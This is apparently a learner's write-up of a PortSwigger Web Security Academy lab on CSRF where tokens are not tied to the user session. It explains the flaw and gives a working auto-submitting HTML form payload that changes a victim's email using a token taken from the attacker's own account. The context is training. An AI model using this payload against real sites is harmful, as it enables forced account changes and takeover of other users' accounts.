
#CSRF #CSRF-Tokens 

CSRF where token is not tied to user session: [link](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)

Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.

in this challenge you should send correct token but the backend does not check if the token tied in to the session so the solution is create an account and take the token from it and send token with you request:

this is my token `96qe9cTCz0dpdYnZnKCo9kkgBJD5Tn6J` and i will try to send the request with it 

**payload :**

```
<html>

<form class="login-form" name="change-email-form" action="https://0a5a00940488727a81a19d16002d00d0.web-security-academy.net/my-account/change-email" method="POST">

<label>Email</label>

<input required="" type="email" name="email" value="helllo@gmail.com">

<input required="" type="hidden" name="csrf" value="96qe9cTCz0dpdYnZnKCo9kkgBJD5Tn6J">

<button class="button" type="submit"> Update email </button>

</form>

<script>

document.forms[0].submit()

</script>

</html>

```